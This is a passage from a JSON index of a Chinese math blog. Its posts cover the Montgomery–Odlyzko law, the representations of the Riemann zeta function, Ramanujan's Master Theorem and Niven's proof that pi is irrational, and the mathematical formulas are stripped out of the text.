世纪科学家的未解之谜。"},{"title":"","date":"2025-11-05T06:22:00.000Z","updated":"2025-11-05T06:31:00.000Z","comments":true,"path":"notes/Zeta/77.html","permalink":"https://blog.mhuig.top/notes/Zeta/77","excerpt":"","text":"蒙哥马利 - 奥德利兹科定律 蒙哥马利 - 奥德利兹科定律 蒙哥马利 - 奥德利兹科定律揭示了数学中最神秘的对象之一，黎曼 函数非平凡零点的分布规律，竟与核物理中重原子核能级的统计特性存在深刻关联。这一发现诞生于 20 世纪 70 年代，由休・蒙哥马利（Hugh Montgomery）通过理论分析提出，并经安德鲁・奥德利兹科（Andrew Odlyzko）的大规模数值计算验证，最终成为连接解析数论与随机矩阵理论的关键桥梁。该定律不仅为黎曼假设提供了新的视角，更开创了 \"数论 - 物理\" 交叉研究的全新范式，其核心结论是：黎曼 函数零点的对关联函数与随机厄米矩阵本征值的对关联函数具有完全相同的数学形式。 蒙哥马利 - 奥德利兹科定律: 黎曼 函数相继非平凡零点之间的（适当正则化的）间隔分布与 GUE 算子本征值的间隔分布在统计意义上一致 历史背景：从素数分布到核物理的意外邂逅黎曼 函数 的非平凡零点分布问题，自 1859 年黎曼提出著名猜想以来，一直是数论领域的核心谜题。这些零点的位置与素数分布密切相关，而素数的不规则性长期困扰着数学家。20 世纪中期，物理学领域出现了意想不到的突破，恩里科・费米（Enrico Fermi）和尤金・维格纳（Eugene Wigner）发现，重原子核的低能共振能级间距呈现出与经典统计力学预测截然不同的分布特性 。维格纳在 1956 年大胆提出，这种能级分布可用随机厄米矩阵的本征值统计来描述，这一思想后来发展为随机矩阵理论（Random Matrix Theory, RMT）的基础。 1972 年，蒙哥马利在普林斯顿高等研究院访问期间，深入研究了黎曼零点的对关联性质。他假设黎曼假设成立（即所有非平凡零点都位于临界线 上），将零点表示为 ，其中 为实部为零的复数的虚部。通过分析这些零点虚部的间距分布，蒙哥马利推导出了对关联函数的表达式 。在一次偶然的下午茶谈话中，他向物理学家弗里曼・戴森（Freeman Dyson）展示了这一结果，戴森立即认出这与随机矩阵理论中高斯幺正系综（GUE）的本征值对关联函数完全一致。这一戏剧性的相遇，开启了数论与物理交叉研究的新纪元。 1987 年，奥德利兹科通过计算黎曼 函数前 1.5 亿个零点（后来扩展到 个零点），以空前的精度验证了蒙哥马利的理论预测 。他的数值结果显示，零点间距的分布与 GUE 系综的理论曲线几乎完美吻合，为蒙哥马利 - 奥德利兹科定律提供了强有力的实验支持。这一发现促使数学家卡茨（Nicholas Katz）和萨纳克（Peter Sarnak）将该定律推广到更广泛的 L 函数零点分布，建立了 \"数论 L 函数 - 随机矩阵\" 对应的一般框架。 定义与数学表述蒙哥马利 - 奥德利兹科定律的核心是对关联函数（pair correlation function）的概念，它描述了随机序列中两个元素间距的统计分布。对于黎曼 函数的零点，我们首先需要对零点的虚部进行正则化处理。已知当 时，临界线 上虚部满足 的零点个数约为 。为了消除整体密度的增长，我们引入正则化零点间距 ，并通过平均间距 进行归一化，得到 。 对关联函数的定义蒙哥马利定义的对关联函数 如下： 其中 为实参数， 是权重函数（确保求和收敛）， 和 遍历所有虚部不超过 的零点。该函数描述了零点对 的相对间距 的统计分布。 定律的数学形式蒙哥马利在假设黎曼假设成立的前提下证明，当 时， 满足渐近关系： 而对于 ，他猜想 。这一结果与随机矩阵理论中高斯幺正系综（GUE）的对关联函数完全一致，后者描述了 随机厄米矩阵本征值在大 极限下的统计分布 。奥德利兹科的数值计算不仅验证了这一公式，还发现当 较大时， 确实趋近于 1，表明远距离零点之间几乎没有相关性。 值得注意的是，巴卢约特（Baluyot）等人在 2024 年的工作中，在不假设黎曼假设的条件下，证明了一个无条件形式的蒙哥马利定理。他们仅要求零点的实部满足 （其中 ），就得到了至少 61.7% 的零点是简单零点的结论，这进一步支持了蒙哥马利 - 奥德利兹科定律的普适性。 详细推导过程：从黎曼零点到对关联函数蒙哥马利对关联函数的推导基于黎曼 函数的显式公式和复分析技巧，整个过程可分为四个关键步骤：零点统计的数学建模、显式公式的应用、积分变换与留数计算、渐近分析与结果提取。以下将详细展开每一步的推导细节。 第一步：零点对关联的数学建模考虑区间 内零点的虚部 ，定义计数函数 ，其渐近公式为： 为了研究零点的局部分布，引入归一化间距 ，其中 和 是相邻零点的虚部。蒙哥马利定义的对关联函数 实际上是归一化间距 的分布函数的傅里叶变换 。通过权重函数 （它是 函数的傅里叶变换），可以将离散的零点对求和转化为连续积分。 第二步：利用黎曼 函数的显式公式在黎曼假设下， 函数的对数导数有如下展开： 蒙哥马利考虑了更一般的显式公式。对于 和 ，他证明了： 其中 是冯・曼戈尔特函数（当 时为 ，否则为 0）， 是实参数。这一公式将零点的分布与素数的分布（通过冯・曼戈尔特函数）联系起来，是解析数论中连接局部零点信息与整体素数性质的核心工具。 第三步：积分变换与留数计算为了提取对关联信息，蒙哥马利对显式公式两边取平方并在 上积分。左边积分涉及零点对 的贡献： 通过变量替换 和 ，并利用留数定理计算积分： 其中 。代入 和 ，得到左边积分的主项为 。 第四步：渐近分析与结果提取右边积分涉及素数项的贡献，通过傅里叶变换和 Parseval 恒等式，可以证明其主项为 。令左右两边的主项相等，最终得到： 这一结果表明，当两个零点的归一化间距 很小时（即 ）， ，呈现平方律增长；而当 时， ，表明零点之间不存在长程关联。这一行为与随机厄米矩阵本征值的对关联函数完全一致，揭示了黎曼零点分布的量子力学特征。 与随机矩阵理论的联系：GUE 系综的普适性随机矩阵理论中，高斯幺正系综（GUE）由所有 厄米矩阵 组成，其概率密度函数为 。当矩阵阶数 时，本征值的统计性质呈现出普适性，与具体的概率分布无关。维格纳在 1956 年猜测，重原子核的能级分布应服从 GUE 统计，这一猜想后来被大量实验数据证实。 GUE 对关联函数的推导对于 GUE 系综，本征值密度在大 极限下满足维格纳半圆律 （归一化到区间 ）。对关联函数 定义为间距 处找到两个本征值的概率密度，其精确表达式为： 这与蒙哥马利得到的 完全相同！这一惊人的巧合暗示，黎曼零点的分布与随机厄米矩阵的本征值分布遵循相同的普适定律。这就像在喜马拉雅山脉发现了海洋生物化石，它表明两个看似无关的世界有着共同的起源。 普适性的数学解释卡茨和萨纳克在 1999 年的工作中指出，蒙哥马利 - 奥德利兹科定律是更广泛的 \"函数域上的黎曼假设\" 的特例 。他们证明，对于有限域上代数曲线的 函数，其零点分布同样满足随机矩阵理论的普适统计规律。这表明，零点 - 本征值对应并非偶然，而是源于某种深层次的数学结构，可能与量子混沌系统的能级分布有关。 从物理角度看，黎曼零点的分布行为类似于量子可积系统与量子混沌系统的边界情况。维格纳 - 戴森猜想指出，量子混沌系统的能级统计服从随机矩阵理论，而可积系统则服从泊松分布（对应 ）。黎曼零点的对关联函数 恰好处于这两种极端情况之间，暗示 函数可能是某种 \"普遍混沌系统\" 的数学模型。 应用与推广：从黎曼 函数到一般 L 函数蒙哥马利 - 奥德利兹科定律不仅深刻影响了数论和数学物理，还在多个领域展现出广泛的应用价值。其核心思想，数论对象的统计性质与随机矩阵理论的普适规律相关联，已成为现代数学的重要范式。 零点简单性的证明蒙哥马利最初的工作就隐含了零点简单性的结论。他证明，假设黎曼假设成立，则至少 67.9% 的非平凡零点是简单的（即没有重零点）。巴卢约特等人 2024 年的无条件结果将这一比例改进为 61.7%，只需假设零点的实部离临界线不远（ ）。这一进展为黎曼假设的证明提供了新的思路，通过零点统计性质间接推断其位置。 广义 L 函数的推广蒙哥马利 - 奥德利兹科定律已被推广到更广泛的自守 L 函数族。例如，戴德金 函数、椭圆曲线的 Hasse-Weil L 函数等，其零点分布均表现出与随机矩阵理论对应的特征 。卡茨和萨纳克提出了 \"单值群猜想\"，断言 L 函数的零点统计性质由其伽罗瓦表示的单值群类型决定：正交群对应高斯正交系综（GOE），辛群对应高斯辛系综（GSE），而一般线性群对应 GUE 。这一猜想将数论、代数几何与随机矩阵理论紧密结合，成为朗兰兹纲领的重要组成部分。 数值验证与算法发展奥德利兹科为验证该定律发展的大规模零点计算算法，推动了数值分析和高性能计算的进步。他使用快速傅里叶变换（FFT）加速 函数的计算，使得零点计算的复杂度从 降至 。2001 年，他计算了黎曼 函数第 个零点附近的 1750 万个零点，进一步确认了对关联函数的 GUE 行为 。这些计算不仅验证了理论预测，还为研究低阶项和偏差提供了数据支持。 结论与展望：未解之谜与未来方向蒙哥马利 - 奥德利兹科定律的发现，彻底改变了数学家对黎曼零点分布的理解。它揭示了一个深刻的事实：数论中最纯粹的对象之一，黎曼 函数的零点，竟与量子力学中最复杂的系统之一，重原子核的能级，遵循相同的统计规律。这一联系至今没有完全的数学解释，成为 21 世纪数学最引人入胜的谜题之一。 核心未解问题数学机制的解释：为什么黎曼零点的分布会与随机矩阵的本征值分布相同？这是否暗示 函数与某个量子混沌系统存在对应关系？目前最有希望的方向是量子力学中的 \"希尔伯特 - 波利亚猜想\"，该猜想假设存在自伴算子 ，使得其本征值恰好是黎曼零点的虚部 。 低阶项的算术意义：蒙哥马利 - 奥德利兹科定律描述的是主项行为，而数值计算显示零点分布存在微小的低阶偏差。这些偏差是否包含算术信息？例如，是否与素数的分布或 L 函数的特殊值有关？ 非临界线零点的可能性：虽然黎曼假设断言所有零点都在临界线上，但蒙哥马利 - 奥德利兹科定律的无条件形式（如巴卢约特等人的结果）表明，即使存在离临界线不远的零点，其统计性质仍可能满足类似规律 。这为研究黎曼假设的弱形式提供了新途径。 未来研究方向从数学角度看，将蒙哥马利 - 奥德利兹科定律推广到高维关联函数（如 n 点关联）是一个重要方向。目前已知 2 点关联函数与 GUE 一致，但 3 点及以上关联的严格证明仍缺失 。从物理角度看，探索 L 函数零点分布与量子引力、弦理论的可能联系，可能带来新的突破。 蒙哥马利 - 奥德利兹科定律的故事，生动地展示了数学与物理交叉融合的创造力。当数论学家和物理学家学会用同一种语言交谈时，他们发现彼此一直在描述同一个宇宙。黎曼零点与随机矩阵的神秘对应，或许正是打开 21 世纪数学新大门的钥匙。"},{"title":"","date":"2025-11-06T23:22:00.000Z","updated":"2025-11-06T23:31:00.000Z","comments":true,"path":"notes/Zeta/78.html","permalink":"https://blog.mhuig.top/notes/Zeta/78","excerpt":"","text":"黎曼 Zeta 函数的表示方法 黎曼 Zeta 函数的表示方法 引言：数学宇宙的枢纽黎曼 函数是数学中最深刻、最神秘的函数之一，它如同一座桥梁，连接着数论、复分析、几何与物理等多个领域。自 1859 年波恩哈德・黎曼发表那篇开创性的论文《论小于给定数值的素数个数》以来， 函数的研究不仅推动了纯数学的发展，还在量子场论、弦理论等物理学分支中找到了意想不到的应用。这里将系统梳理 函数的各种表示方法，从最初的级数定义到深刻的解析延拓，从欧拉乘积到黎曼 - 西格尔公式，逐步揭示这个函数的丰富结构与内在统一性。 历史背景：从欧拉到黎曼的思想演进 函数的历史可追溯至 18 世纪瑞士数学家莱昂哈德・欧拉。1737 年，欧拉首次研究了实变量情形下的级数 ，并证明了它与素数分布的深刻联系，即著名的欧拉积公式。然而，真正将 函数提升至新高度的是黎曼。在 1859 年的那篇仅有 8 页的论文中，黎曼做出了三项革命性贡献：将 函数的定义域解析延拓至整个复平面（除 处的单极点）；发现了 与 之间的函数方程；提出了关于非平凡零点分布的著名猜想，即黎曼假设（所有非平凡零点的实部均为 ）。 黎曼的工作在当时并未立即被完全理解。直到 1896 年，雅克・阿达马和夏尔 - 让・德拉瓦莱・普桑才利用 函数的性质证明了素数定理，这一成就标志着解析数论的成熟。值得注意的是，黎曼在其论文中巧妙地避开了级数收敛性的复杂讨论，直接通过留数定理得到了解析延拓，这种方法展现了复变函数论的强大威力。此外，黎曼在研究中实质上使用了复平面上的旋转操作（如将 函数旋转角度 ），尽管他并未明确提及复平面表示，这在当时是相当超前的思想。 基本定义与初级表示1. Dirichlet 级数定义黎曼 函数最基本的定义是 Dirichlet 级数： 这个级数在复平面上的收敛域为 。当 为实数且 时，这是一个实数项级数；当 为复数 时，级数的收敛性由实部 决定。例如，当 时，级数收敛到 ，这就是著名的巴塞尔问题，由欧拉在 1735 年解决。 为了将 函数的定义域扩展到 （ ），我们可以利用交错级数的性质，引入狄利克雷 eta 函数 ： 在 时收敛。通过简单的代数运算，可以得到 与 之间的关系： 这一表达式将 函数的定义域延拓到了 ， 的区域。 2. 欧拉积公式欧拉的另一项伟大发现是 函数的乘积表示，即欧拉积公式： 其中 表示全体素数的集合。这个公式在 时成立，它将 函数与素数分布紧密联系起来，是解析数论的基石。 证明思路：对于每个素数 ，考虑几何级数展开： 将所有这些几何级数相乘，根据素数的唯一分解定理，乘积中每一项 （ 为正整数）恰好出现一次。因此，乘积等于 。 欧拉积公式的重要性在于，它将数论中离散的素数与分析中连续的 函数联系起来，为后续研究素数分布提供了强大工具。例如，当 时，我们有： 这一结果展示了素数与圆周率之间令人惊讶的联系。 3. 积分表示：与伽马函数的联系通过伽马函数 的积分定义，我们可以得到 函数的积分表示。伽马函数定义为： 将上式两边同时除以 ，得到： 对 从 1 到 求和，交换求和与积分顺序（在 时，由一致收敛性保证交换的合理性）： 注意到 （几何级数求和），因此： 这一积分表示揭示了 函数与伽马函数、指数函数之间的深刻联系，为后续的解析延拓奠定了基础。 解析延拓与积分表示的深化1. 利用取整函数的积分表示为了将 函数延拓到更广泛的区域，我们可以利用取整函数 （不大于 的最大整数）。考虑积分： 将积分区间分割为 ，其中 为正整数。在每个区间上， ，因此： 计算积分 ，代入上式得： 展开右边的级数，得到一个 telescoping 级数（部分和可以相互抵消）： 因此，我们得到： 这个积分表示在 时成立，进一步扩展了 函数的定义域。通过分部积分或其他技巧，还可以将其延拓到整个复平面（除 外）。 2. 黎曼的解析延拓方法黎曼在其 1859 年的论文中，采用了一种更为巧妙的方法进行解析延拓。他考虑了以下积分： 其中积分路径绕过原点，使得 有良好定义。通过留数定理计算这个积分，黎曼得到了 在整个复平面上的表达式。这种方法的核心思想是利用复变函数的围道积分和留数理论，避开了直接讨论级数收敛性的困难，展现了复分析的深刻威力。 函数方程与对称性质黎曼 函数最优美的性质之一是其函数方程，它揭示了 与 之间的对称关系： 这个方程是解析数论的核心，它将 函数在右半平面（ ）和左半平面（ ）的值联系起来。例如，我们可以利用它计算 函数在负整数点的值，如 （尽管这需要理解为解析延拓的结果，而非原始级数的和）。 函数方程的推导概要函数方程的证明可以通过多种途径，其中一种经典方法是利用之前得到的积分表示 。将积分区间分为 和 ： 对第一个积分作变量替换 ，对第二个积分作变量替换 ，并利用几何级数 （当 时），经过一系列复杂的计算和化简，可以得到函数方程。 Xi 函数与对称性的深化为了更清晰地展现 函数的对称性，黎曼引入了 Xi 函数 ： 根据 函数的函数方程，可以证明 是一个整函数（在整个复平面上解析），并且满足 。这一对称性表明， 函数的零点关于直线 对称，这是黎曼假设的基础。 最近的研究通过对 Xi 函数进行分部积分和变量替换，得到了更深入的积分表示。例如，利用 （ theta 函数的一种变体），可以将 表示为： 当 时（即临界线上），上式变为： 这表明 是 的偶函数，因此 函数的非平凡零点关于实轴对称。这种表示方法为研究零点分布提供了重要工具，也为黎曼假设提供了直观支持 —— 如果 的零点都位于 ，那么 函数的非平凡零点也同样如此。 高级表示：乘积公式与解析延拓1. 阿达马乘积表示整函数的因子分解定理表明，任何非常数整函数都可以表示为其零点的乘积。对于 函数，由于它在整个复平面上只有一个单极点 ，其标准化形式（如 Xi 函数）是整函数，可以应用这一定理。阿达马在 1893 年证明了 函数的乘积表示： 其中 是归一化后的整函数。这一公式由 Hadamard 通过整函数理论严格证明，通过引入 xi 函数消除了 zeta 函数在 处的奇点及负偶数平凡零点。 对于 Zeta 函数有正比关系： 详细的有： 其中： 遍历 函数的所有非平凡零点（即满足 的零点）； 是一个常数，由 确定，其值为 ，其中 是欧拉 - 马歇罗尼常数； 项补偿了 函数在负偶数点 的平凡零点。 阿达马乘积表示的重要性在于，它将 函数完全由其零点和极点决定，揭示了函数的整体结构。每个非平凡零点 通过因子 对函数值产生影响，这也是研究零点分布为何对理解 函数至关重要的原因。 2. 黎曼 - 西格尔公式在计算 函数在临界线（ ）上的值时，黎曼 - 西格尔公式（Riemann-Siegel formula）是一个强大的工具。黎曼在其未发表的笔记中已经得到了这一公式的雏形，后来由西格尔在 1932 年整理发表。该公式将 表示为一个主项和一个余项之和，主项是有限项的和，余项则是一个积分，便于数值计算。 黎曼 - 西格尔公式的推导基于 函数的积分表示和最速下降法（method of steepest descent），其具体形式较为复杂，但核心思想是将难以计算的无穷级数或积分转化为收敛迅速的表达式。这一公式不仅为数值验证黎曼假设提供了可能（至今已验证了超过十万亿个零点都位于临界线上），也为理论研究提供了深刻见解。 应用与现代研究1. 素数分布的显式公式 函数的零点分布与素数分布之间存在着深刻的联系。通过对 函数的对数导数 进行积分，可以得到素数计数函数 （小于等于 的素数个数）的显式表达式： 余项 其中 是对数积分函数， 遍历 函数的非平凡零点。这个公式表明，素数的分布直接受 函数零点的影响。如果黎曼假设成立，那么余项的估计可以得到显著改善，素数定理的误差项也会更小。 2. 物理学中的应用 函数的应用远不止于数论。在量子场论中， 函数 regularization 是处理发散积分的一种重要方法。例如，在计算 Casimir 效应（真空中两块平行导体板之间的吸引力）时，能量密度的表达式包含无穷级数，通过 函数的解析延拓可以将其正则化为有限值。此外，在非对易几何、弦理论等领域， 函数也有重要应用，如描述非对易环面上的玻色子和费米子场。 3. 广义求和与发散级数 函数的研究也推动了发散级数求和理论的发展。欧拉最早认识到需要为发散级数赋予一个合理的值，而黎曼的解析延拓思想为这一问题提供了严格的数学基础。例如，级数 可以通过 来理解，这里的等号应理解为解析延拓的结果，而非通常意义上的求和。这种广义求和方法在物理学中有着广泛应用，如弦理论中的 tachyonic 场论。 结论与展望黎曼 函数的各种表示方法，从最初的 Dirichlet 级数和欧拉积，到深刻的阿达马乘积和黎曼 - 西格尔公式，共同编织了一幅连接数论、复分析与物理学的宏大画卷。每一种表示都揭示了函数的一个侧面：级数定义直观展示了它与自然数的联系，欧拉积揭示了它与素数的深刻关联，积分表示连接了离散与连续，而函数方程和乘积公式则展现了其优美的对称性和整体结构。 尽管经过了一个半世纪的研究， 函数仍有许多未解之谜，其中最著名的就是黎曼假设。近年来，研究者们尝试从多个角度攻击这一问题，如通过分析 函数在临界线上的性质、研究其零点的统计规律与随机矩阵理论的联系等。例如，有学者通过研究 函数的向量表示，提出了一种基于共轭调和函数性质的黎曼假设证明思路，尽管尚未完全成功，但为问题的解决提供了新的视角。 从欧拉到黎曼，从阿达马到现代的研究者们， 函数的故事是人类智力探索的一个缩影。它不仅是数学的瑰宝，也为我们理解宇宙的深层结构提供了独特的视角。正如黎曼在其开创性论文中所暗示的，对 函数的深入研究，或许正是揭开数学宇宙终极奥秘的开始。"},{"title":"","date":"2025-11-07T01:22:00.000Z","updated":"2025-11-07T01:31:00.000Z","comments":true,"path":"notes/Zeta/79.html","permalink":"https://blog.mhuig.top/notes/Zeta/79","excerpt":"","text":"拉马努金主定理 拉马努金主定理 拉马努金主定理（Ramanujan Master Theorem）是 20 世纪数学史上最具洞察力的发现之一，它建立了幂级数展开与积分变换之间的深刻联系，展现了离散与连续数学结构的内在统一性。1913 年，印度数学家斯里尼瓦萨・拉马努金在给 G.H. 哈代的信中首次提出这一定理的雏形，其原始表述虽缺乏严格的收敛性证明，却蕴含着惊人的数学直觉。哈代后来完善了定理的收敛条件，使其成为复分析与数论研究的重要工具。这一定理的核心价值在于，它将无穷级数的求和问题转化为函数在负整数点的取值，为复杂积分计算提供了简洁路径，其影响从经典分析延伸至现代物理的量子场论与弦理论领域。 历史背景与发现历程拉马努金的数学思维具有鲜明的独创性。1887 年出生于印度泰米尔纳德邦的他，几乎完全依靠自学掌握了高等数学，1903 年获得的《纯粹和应用数学基本结果概要》（G.S. Carr 著）成为其数学启蒙的关键读物。在极端贫困的环境下，拉马努金坚持记录数学发现，积累了数千个公式，其中许多包含后来被证实的深刻结果。1913 年，他向剑桥大学的哈代寄送了包含 120 个定理的信件，其中三个关于模形式的公式令哈代震惊 ——\"它们完全征服了我... 能写下它们的人一定是最顶尖的数学家\"。 拉马努金在 1916 年的《剑桥哲学汇刊》论文中系统阐述了主定理的基本思想，但他的证明方法缺乏现代数学的严格性，尤其未明确处理积分收敛性问题。哈代在 1920 年代补充了关键的收敛条件，要求函数 满足指数型增长限制 （其中 ），这一条件确保了复平面上积分路径的合理性。值得注意的是，拉马努金的原始手稿显示，他通过对具体例子的归纳而非严格推导发现了这一规律，这种 \"直觉即真理\" 的思维方式与西方数学传统形成鲜明对比。 严格定义与数学表述拉马努金主定理的现代标准形式可表述为：若函数 具有交错幂级数展开 其中 可延拓为复平面上的整函数，且满足哈代增长条件，则对于 ，其梅林变换可表示为 这里 是欧拉伽马函数。该定理的等价形式常用 直接表示级数系数：若 ，则 其中 。这两种形式通过伽马函数的余元公式 相互联系。 定理成立的关键条件包括： 在半平面 （ ）上解析；存在常数 使得对所有 满足 ；以及积分路径上无极点干扰。这些条件确保了复分析中的留数定理能够有效应用，将无穷级数求和转化为函数在特定点的取值。 证明方法详解方法一：基于留数定理的复分析证明考虑复变函数 ，其在复平面上的极点位于 。构造从 到 （ ）的积分路径，当 时，由 的增长条件和斯特林公式 可知，路径两端的贡献趋于零。 根据留数定理，围道积分等于被积函数在所有极点留数之和： 计算 处的留数，注意到 在 处的留数为 ，因此： 代入 的级数展开式即得： 最后应用梅林变换的定义，将上式两边同乘 并积分，交换积分顺序即完成证明。 方法二：通过伽马函数的积分表示推导利用伽马函数的积分表示 ，考虑 的特殊情形，此时 ，代入定理结论得： 这恰为伽马函数的定义，验证了定理在基本情形下的正确性。对于一般情形，将 的级数逐项积分： 积分 ，代入得： 当 为多项式时，上式可由二项式定理化简为 ，从而启发一般情形的证明思路。 方法三：广义拉马努金定理的归纳证明若 且 ，则 证明通过变量替换 建立积分变换的尺度不变性，再利用泰勒展开交换积分与求和顺序： 令 ，通过参数代换可将级数转化为积分形式，最终得到广义定理的结论。取 时 ，即还原拉马努金主定理。 应用方法与实例分析贝塔函数与伽马函数关系的推导贝塔函数定义为 ，通过变量替换 可转化为 将 展开为幂级数 ，对比拉马努金定理形式可知 ，代入定理得： 这一经典结果通过拉马努金定理得到极大简化，避免了传统证明中复杂的变量替换。 广义菲涅尔积分的计算考虑积分 ，令 得 ， ，转化为 利用欧拉公式 ， ，此时 ，代入定理得： 取虚部并令 ，最终得到 ，当 时还原为菲涅尔积分 。 黎曼 函数与伯努利数的关联黎曼 函数的积分表示为 ，被积函数可展开为 ，逐项积分得 。利用伯努利数生成函数 ，对比拉马努金定理形式，其中 ，代入得： 左端即为 ，从而建立关键关系 ，这一结果在解析数论中具有基础地位。 费曼图计算中的应用在量子场论中，拉马努金主定理为费曼图的积分计算提供了高效工具。Gonzalez 等人 2011 年的研究表明，通过施温格参数化将费曼积分转化为指数形式后，可直接应用广义拉马努金定理。例如，对于传播子积分 ，通过维度正规化技术引入参数 ，应用定理可快速得到结果的解析表达式，避免传统 Feynman 参数积分的复杂计算。这种方法已成为高能物理计算的标准工具之一。 扩展形式与现代发展拉马努金主定理的扩展主要沿着两个方向发展：一是 Atale 提出的 Type-(I,II) 插值公式，二是多变量推广的 \"括号方法\"。Type-I 插值公式处理仅含奇次项的级数： 类似地，Type-II 插值处理偶次项级数，两者分别对应正弦和余弦积分的推广。这些扩展使得定理能够处理如 、 等特殊函数的积分，进一步丰富了其应用范围。 2012 年，Chaudhry 和 Qadir 将哈代的收敛条件扩展到更广泛的函数类，允许 在更大的半平面上解析，这一进展使得定理可应用于更多非多项式增长的函数。在数论领域，拉马努金定理与黎曼假设的研究存在深刻联系，Riesz 函数 的积分表示正是通过主定理建立，而 Riesz 准则表明黎曼假设等价于 。 从数学史角度看，拉马努金主定理的发现过程完美体现了直觉思维与严格证明的辩证关系。拉马努金凭借对数字模式的敏锐洞察直接写出定理结论，而哈代等数学家则提供了坚实的逻辑基础。这种思维方式的互补性，正是推动数学发展的重要动力。今天，定理的影响已超越纯数学领域，在量子场论的发散级数重整化、弦理论的额外维度计算等前沿物理研究中，拉马努金的数学遗产依然发挥着关键作用。 拉马努金主定理的故事也引发深刻思考：在追求严格性的同时，数学是否应当保留足够的直觉空间？拉马努金的思想属于这样一种类型，它们直击问题核心而无需冗长的中间步骤。这种独特的思维方式，使得拉马努金的数学发现如同跨越百年的火炬，持续照亮着数学探索的新领域。"},{"title":"","date":"2025-11-08T02:22:00.000Z","updated":"2025-11-08T02:31:00.000Z","comments":true,"path":"notes/Zeta/80.html","permalink":"https://blog.mhuig.top/notes/Zeta/80","excerpt":"","text":"不知名的碎片 8 不知名的碎片 8 可以是数也可以是式子。 这个性质可以用来搞积。 我们从之前文章的例题中拿出两个式子来研究： 左边是求和，右边是等比数列求和。 设左边求和为 右边等比数列求和为 其中 的通项为 的通项为 我们知道如果通项相等，则前 n 项和相等。 那么反过来，前 项和相等 ,那么通项 相等吗？ 必然相等。即： 这恰好就是伽马函数换元变形后的结果。 我们也可以尝试数学归纳的方法推导。 考虑积分： 先对原式进行一次分部积分，得： 其中： 所以 因此我们又将积分问题转换成了递推关系问题： 最终，我们得到了"},{"title":"","date":"2025-11-08T06:22:00.000Z","updated":"2025-11-08T06:31:00.000Z","comments":true,"path":"notes/Zeta/81.html","permalink":"https://blog.mhuig.top/notes/Zeta/81","excerpt":"","text":"不知名的碎片 9 不知名的碎片 9 我们从之前关于 π 无理性证明的文章中拿出一个式子来研究： 变形我们的目标是对上式进行一系列变形变为 。 变量替换：对称区间化平移变换消去区间不对称性 原积分区间为 ，中点为 。设 （即 ），则： 当 时， ；当 时， ，积分区间变为对称区间 。 微分关系： 。 三角函数化简：利用诱导公式 ，故 。 多项式部分的代数变形展开 将 代入多项式部分： 展开后得： 若要使多项式化为平方差形式 ，需满足交叉项系数为 0 且常数项匹配： 令 （消去一次项 ），解得 。 代入常数项： ，需进一步令 ，则 。 此时多项式简化为： 引入有理数假设与积分规范化假设 为有理数 若 是有理数，设 （ 为互质正整数），则 ，代入多项式得： 为使被积函数系数为整数，分子分母同乘 ，并结合 规范化，最终得： 整合结果将变量替换、多项式化简和有理数假设代入原积分，得到： 其中关键参数对应关系为 、 ，且积分变量 替换回 （哑变量无关性）。 验证与核心逻辑 变量替换合理性：通过 实现区间对称化，简化被积函数奇偶性分析。 多项式构造技巧：选择 消去一次项，确保多项式为平方差形式，为后续递推和估值奠定基础。 有理数假设作用：引入 因子后，积分 在 为有理数时成为整数，与 “积分可任意小” 矛盾，最终证明 π 的无理性。 这一变形展现了从一般多项式积分到特殊对称积分的构造过程，是尼文 无理性证明的核心步骤。 证明 π 是无理数要证明 是无理数，可通过构造积分 的递推关系，结合反证法导出矛盾。以下是具体步骤： 反证法假设与积分构造假设 为有理数：设 （ 为互质正整数），则 。 定义积分： 对称区间：积分区间 关于原点对称，被积函数 为偶函数，可简化为 。 多项式性质： ，通分后分子为整系数多项式，乘以 后变为整数多项式，确保积分的整数性基础。 分部积分与递推公式推导第一步 分部积分：设 ， ，则 ， 。积分化为： 边界项 （因 时 ），剩余积分： 第二步分部积分：设 ， ，则 ， 。 整理后得递推关系： 初始条件： （整数）； （整数）。 整数性证明归纳法： 基础情形： ， 均为整数。 归纳假设：设 为整数，由递推公式 ，因 为整数，故 为整数的线性组合，仍为整数。 核心结论：对所有 ， 为正整数（因被积函数在区间内恒正，积分值为正）。 积分估值与矛盾被积函数有界性：在区间 上， ，且 ，故： 积分估计： 因 （常数），当 时，分母 增长速度远超分子指数项，故 。 矛盾：存在充分大的 使得 ，但 为正整数，这与 “正整数至少为 1” 矛盾。 结论原假设 “ 是有理数” 不成立，故 为无理数。 该证明通过对称区间积分构造、递推关系推导和极限估计，简洁地导出矛盾，是尼文证明的变体形式，体现了分析学与数论的巧妙结合 。 这一方法的核心价值在于：通过多项式规范化（ 因子）和对称区间设计，同时保证了积分的整数性和可任意小性。"},{"title":"","date":"2025-11-08T08:22:00.000Z","updated":"2025-11-08T08:31:00.000Z","comments":true,"path":"notes/Zeta/82.html","permalink":"https://blog.mhuig.top/notes/Zeta/82","excerpt":"","text":"不知名的碎片 10 不知名的碎片 10 第一个式子来自之前关于 Zeta 函数部分和通项的文章 第二个式子来自之前关于 π 无理性证明的文章 笔者将这两个式子放在这里，是因为这两个式子形式上令人惊讶的相似性。仿佛他们就是一家人，来自同一个快乐大家族。也许他们之间存在的关联就像魔群月光一样可望而不可即，也许他们之间没什么关系，只是笔者的一厢情愿。 朗兰兹纲领指出：数论、代数几何和群表示论是密切相关的。 如果第一个式子与 Zeta 函数相关代表数论，第二个式子与圆周率相关代表几何，那么推测出在群论中也能找到这样的形式属于同一个快乐大家族。 遗憾的是笔者暂未找到这一缺失的拼图。 Tips 变量替换与积分化简令 （即 ， ），积分区间变为 ，且 。代入后化简得： 即：这一形式与埃尔米特（Hermite）1873 年研究的贝塞尔函数积分表示高度相似。贝塞尔函数 的泊松积分公式为： 对比可知，当 时 可表示为贝塞尔函数的显式形式： 如果令 则这揭示了该积分与特殊函数的深层联系，也印证了尼文证明中积分构造的数学根源。… 经过一通乱炖变形发现：第一个式子与伽马函数有关联，而第二个式子与贝塞尔函数有关联。他们都是特殊函数，这中间一定有问题。那么群论或者群表示论又能和哪个特殊函数有关？ 难道每个特殊函数都会对应一个数学分支？"},{"title":"","date":"2025-11-09T05:22:00.000Z","updated":"2025-11-09T05:31:00.000Z","comments":true,"path":"notes/Zeta/83.html","permalink":"https://blog.mhuig.top/notes/Zeta/83","excerpt":"","text":"不知名的碎片 11 不知名的碎片 11 设函数 在 内有连续导数, 证明 证法 1 : 由积分中值定理, 存在 ,使 再用拉格朗日中值定理, 得到 所以 故原式左端 证法 2: 令 , , 则 